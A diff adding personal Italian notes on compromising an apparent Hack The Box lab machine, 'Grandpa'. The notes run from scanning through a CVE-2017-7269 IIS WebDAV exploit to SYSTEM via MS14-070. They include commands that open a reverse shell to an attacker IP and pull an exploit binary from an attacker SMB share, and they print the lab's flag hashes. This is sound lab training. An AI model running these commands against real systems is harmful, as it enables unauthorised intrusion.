@@ -1,0 +1,176 @@
+10.10.10.14
+
+masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.14
+
+Discovered open port 80/tcp on 10.10.10.14
+
+nmap -sC -sV -p80 10.10.10.14
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-ntlm-info:
+|   Target_Name: GRANPA
+|   NetBIOS_Domain_Name: GRANPA
+|   NetBIOS_Computer_Name: GRANPA
+|   DNS_Domain_Name: granpa
+|   DNS_Computer_Name: granpa
+|_  Product_Version: 5.2.3790
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan:
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Server Type: Microsoft-IIS/6.0
+|   Server Date: Fri, 26 Nov 2021 10:51:01 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  WebDAV type: Unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+il sito è Under Construction
+posso provare con gobuster a cercare eventuali dir/files
+
+/Images               (Status: 301) [Size: 149] [--> http://10.10.10.14/Images/]
+/_private             (Status: 403) [Size: 1529]
+/_vti_cnf             (Status: 403) [Size: 1529]
+/_vti_log             (Status: 403) [Size: 1529]
+/_vti_pvt             (Status: 403) [Size: 1529]
+/_vti_txt             (Status: 403) [Size: 1529]
+/_vti_bin             (Status: 301) [Size: 155] [--> http://10.10.10.14/%5Fvti%5Fbin/]
+/aspnet_client        (Status: 403) [Size: 218]
+/images               (Status: 301) [Size: 149] [--> http://10.10.10.14/images/]
+
+non riesco ad accedere a nessuna directory
+
+provo a cercare usando anche estensioni dei files:
+
+sudo gobuster  dir -u http://10.10.10.14/ -w /usr/share/wordlists/dirb/big.txt -t 200 q -n -e -x .asp,.aspx,.html,.txt,.htm,.js,.xml,.svg,.py,.csv
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.14/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              svg,aspx,js,xml,htm,py,csv,asp,html,txt
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+===============================================================
+2021/11/26 12:13:17 Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.10.14/Images               [Size: 149] [--> http://10.10.10.14/Images/]
+http://10.10.10.14/_private             [Size: 1529]
+http://10.10.10.14/_vti_txt             [Size: 1529]
+http://10.10.10.14/_vti_cnf             [Size: 1529]
+http://10.10.10.14/_vti_log             [Size: 1529]
+http://10.10.10.14/_vti_inf.html        [Size: 1754]
+http://10.10.10.14/_vti_pvt             [Size: 1529]
+http://10.10.10.14/_vti_bin             [Size: 155] [--> http://10.10.10.14/%5Fvti%5Fbin/]
+http://10.10.10.14/aspnet_client        [Size: 218]
+http://10.10.10.14/images               [Size: 149] [--> http://10.10.10.14/images/]
+http://10.10.10.14/~sys.aspx            [Size: 3026]
+http://10.10.10.14/~tmp.aspx            [Size: 3026]
+http://10.10.10.14/~sysadmin.aspx       [Size: 3026]
+http://10.10.10.14/~administrator.aspx  [Size: 3026]
+http://10.10.10.14/~amanda.aspx         [Size: 3026]
+http://10.10.10.14/~lp.aspx             [Size: 3026]
+http://10.10.10.14/~a.aspx              [Size: 3026]
+http://10.10.10.14/~joe.aspx            [Size: 3026]
+http://10.10.10.14/~images.aspx         [Size: 3026]
+http://10.10.10.14/~operator.aspx       [Size: 3026]
+http://10.10.10.14/~adm.aspx            [Size: 3026]
+http://10.10.10.14/~admin.aspx          [Size: 3026]
+http://10.10.10.14/~webmaster.aspx      [Size: 3026]
+http://10.10.10.14/~r.aspx              [Size: 3026]
+http://10.10.10.14/~root.aspx           [Size: 3026]
+http://10.10.10.14/~user.aspx           [Size: 3026]
+http://10.10.10.14/~apache.aspx         [Size: 3026]
+http://10.10.10.14/~ftp.aspx            [Size: 3026]
+http://10.10.10.14/~site.aspx           [Size: 3026]
+http://10.10.10.14/~sysadm.aspx         [Size: 3026]
+http://10.10.10.14/~sys~.aspx           [Size: 3026]
+http://10.10.10.14/~test.aspx           [Size: 3026]
+http://10.10.10.14/~log.aspx            [Size: 3026]
+http://10.10.10.14/~chris.aspx          [Size: 3026]
+http://10.10.10.14/~http.aspx           [Size: 3026]
+http://10.10.10.14/~mike.aspx           [Size: 3026]
+http://10.10.10.14/~mail.aspx           [Size: 3026]
+http://10.10.10.14/~www.aspx            [Size: 3026]
+http://10.10.10.14/~guest.aspx          [Size: 3026]
+http://10.10.10.14/~httpd.aspx          [Size: 3026]
+http://10.10.10.14/~logs.aspx           [Size: 3026]
+http://10.10.10.14/~bin.aspx            [Size: 3026]
+http://10.10.10.14/~nobody.aspx         [Size: 3026]
+
+http://10.10.10.14/_vti_inf.html è una pagina di configurazione che nei commenti della pagina ha indicazioni su
+
+This file contains important information used by the FrontPage client
+	(the FrontPage Explorer and FrontPage Editor) to communicate with the
+	FrontPage server extensions installed on this web server.
+
+quindi c'è Microsoft FrontPage
+
+!-- FrontPage Configuration Information
+    FPVersion="5.0.2.6790"
+    FPShtmlScriptUrl="_vti_bin/shtml.dll/_vti_rpc"
+    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
+    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
+    TPScriptUrl="_vti_bin/owssvr.dll"
+-->
+<p><!--webbot bot="PurpleText"
+preview="This page is placed into the root directory of your FrontPage web when FrontPage is installed.  It contains information used by the FrontPage client to communicate with the FrontPage server extensions installed on this web server.  You should not delete this file."
+--></p>
+
+
+non si riesce ad accedere alle varie pagine/exploit di frontpage
+l'unico path rimasto è sfruttare qualche CVE su Microsoft-IIS/6.0 che è una versione molto vecchia
+
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow  | windows/remote/41738.py   	(https://nvd.nist.gov/vuln/detail/CVE-2017-7269)
+
+(ho trovato uno script che dovrebbe dare già una rev shell --> iis_exploit.py)
+
+python iis_exploit.py 10.10.10.14 80 10.10.16.3 4433
+
+ho una shell
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\network service
+
+
+tra l'alatro non posso accedere alla directory dove c'è user.txt
+
+l'unica directory che potrebbe essere utile è c:\wmpub che è un po anomala e ho permessi di scrittura quindi potrei eseguire uno script
+ non trovo altro di utile, quindi controllo se posso sfruttare qualche kernel exploit
+
+python3 windows_exploit_suggester_p3.py --update
+python3 windows_exploit_suggester_p3.py --database 2021-11-27-mssb.xls --systeminfo ../htb/oscp_like/grandpa/systeminfo_14
+
+
+tra gli output dello script vado a tentativi
+
+ provo ad usare https://www.exploit-db.com/exploits/35936			(exe da https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
+
+ per passarlo:
+
+ python3 ../../../scripts/smbserver.py share .
+ copy \\10.10.16.3\share\MS14-070.exe .
+
+
+ora sono system e posso leggere i files.
+
+bdff5ec67c3cff017f2bedc146a5d869
+9359e905a2c35f861f6a57cecf28bb7b
+
+
+
+
+
+CON METASPLOIT:
+
+		
